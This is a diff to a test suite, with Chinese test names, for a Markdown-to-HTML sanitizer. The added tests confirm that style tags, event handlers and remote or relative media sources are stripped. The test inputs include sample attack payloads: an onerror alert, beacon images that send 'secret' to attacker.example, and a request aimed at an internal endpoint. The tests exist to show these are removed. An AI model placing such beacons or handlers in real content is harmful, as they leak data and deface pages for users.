@@ -78,8 +78,10 @@ describe('renderMarkdownHtml', () => {
     expect(html).toContain('后文')
   })
 
-  it('事件属性被剥除（img onerror 向量）', () => {
-    const html = renderMarkdownHtml('<img src="x" onerror="alert(1)">')
+  it('事件属性被剥除（img onerror 向量；data:image 内联源存活——远程媒体契约）', () => {
+    const html = renderMarkdownHtml(
+      '<img src="data:image/png;base64,iVBORw0KGgo=" onerror="alert(1)">',
+    )
     expect(html).toContain('<img')
     expect(html).not.toContain('onerror')
     expect(html).not.toContain('alert(1)')
@@ -106,6 +108,107 @@ describe('renderMarkdownHtml', () => {
     expect(html).not.toContain('style=')
     expect(html).toContain('<b>粗</b>')
     expect(html).toContain('<strong>强</strong>')
+  })
+
+  it('style 标签被剥除（BUG-20261113-154：DOMPurify 默认白名单放行 <style> 元素，FORBID_ATTR 只禁属性禁不了标签——页面级 CSS defacement 向量）', () => {
+    const html = renderMarkdownHtml(
+      '前文\n\n<style>body{display:none!important}#app{position:fixed;inset:0;background:#fff;z-index:99999}</style>\n\n后文',
+    )
+    expect(html.toLowerCase()).not.toContain('<style')
+    expect(html).not.toContain('display:none')
+    expect(html).toContain('前文')
+    expect(html).toContain('后文')
+  })
+
+  // ---- 远程媒体剥离（BUG-20261115-033）：DOMPurify 默认放行远程/相对
+  // src 的 img/video/audio——渲染即静默外呼（信标/外传）。仅 data:image/*
+  // 存活；srcset 逐候选过滤、poster 摘属性、无源容器连体移除。 ----
+
+  it('远程 http img 被整体移除，正文保留', () => {
+    const html = renderMarkdownHtml(
+      '前文\n\n<img src="https://attacker.example/beacon?d=secret">\n\n后文',
+    )
+    expect(html).not.toContain('<img')
+    expect(html).not.toContain('attacker.example')
+    expect(html).toContain('前文')
+    expect(html).toContain('后文')
+  })
+
+  it('markdown 图片语法 ![alt](http) 同样被剥', () => {
+    const html = renderMarkdownHtml('![外传](http://attacker.example/pixel)')
+    expect(html).not.toContain('<img')
+    expect(html).not.toContain('attacker.example')
+  })
+
+  it('data:image 内联图存活（皮肤引擎 ALLOWED_DATA_URLS 同款契约）', () => {
+    const html = renderMarkdownHtml('<img src="data:image/png;base64,iVBORw0KGgo=">')
+    expect(html).toContain('<img')
+    expect(html).toContain('data:image/png;base64,iVBORw0KGgo=')
+  })
+
+  it('同源相对路径 src 也被移除（可探达 gateway GET 端点）', () => {
+    const html = renderMarkdownHtml('<img src="/api/internal/estop">')
+    expect(html).not.toContain('<img')
+    expect(html).not.toContain('/api/internal/estop')
+  })
+
+  it('video/audio 远程 src 被整体移除', () => {
+    const html = renderMarkdownHtml(
+      '<video src="https://attacker.example/v.mp4"></video><audio src="https://attacker.example/a.mp3"></audio>',
+    )
+    expect(html).not.toContain('<video')
+    expect(html).not.toContain('<audio')
+    expect(html).not.toContain('attacker.example')
+  })
+
+  it('video 子 source 远程源被剥，容器无源连体移除', () => {
+    const html = renderMarkdownHtml(
+      '<video><source src="https://attacker.example/v.mp4" type="video/mp4"></video>',
+    )
+    expect(html).not.toContain('<video')
+    expect(html).not.toContain('attacker.example')
+  })
+
+  it('远程 poster 触发容器移除（poster 摘属性后无可用源）', () => {
+    const html = renderMarkdownHtml('<video poster="https://attacker.example/p.jpg"></video>')
+    expect(html).not.toContain('<video')
+    expect(html).not.toContain('attacker.example')
+  })
+
+  it('track 远程字幕源被剥，无源 video 连体移除', () => {
+    const html = renderMarkdownHtml('<video><track src="https://attacker.example/c.vtt"></video>')
+    expect(html).not.toContain('<video')
+    expect(html).not.toContain('attacker.example')
+  })
+
+  it('srcset 逐候选过滤：非法候选剔除、合法候选保留', () => {
+    const html = renderMarkdownHtml(
+      '<img srcset="https://attacker.example/1x.png 1x, data:image/gif;base64,R0lGOD= 2x">',
+    )
+    expect(html).not.toContain('attacker.example')
+    expect(html).toContain('data:image/gif;base64,R0lGOD=')
+    expect(html).toContain('<img')
+  })
+
+  it('srcset 全不安全 → 属性摘除且 img 死亡移除', () => {
+    const html = renderMarkdownHtml(
+      '<img srcset="https://a.example/1.png 1x, https://b.example/2.png 2x">',
+    )
+    expect(html).not.toContain('<img')
+  })
+
+  it('picture 内 source 远程 srcset 被剥，内联 img 存活', () => {
+    const html = renderMarkdownHtml(
+      '<picture><source srcset="https://attacker.example/x.png"><img src="data:image/png;base64,iVBOR="></picture>',
+    )
+    expect(html).not.toContain('attacker.example')
+    expect(html).toContain('data:image/png;base64,iVBOR=')
+  })
+
+  it('无媒体 HTML 幂等直通（快路径不受影响）', () => {
+    const html = renderMarkdownHtml('纯文本与 [链接](https://example.com) 不受媒体闸影响')
+    expect(html).toContain('href="https://example.com"')
+    expect(html).not.toContain('<img')
   })
 })
 
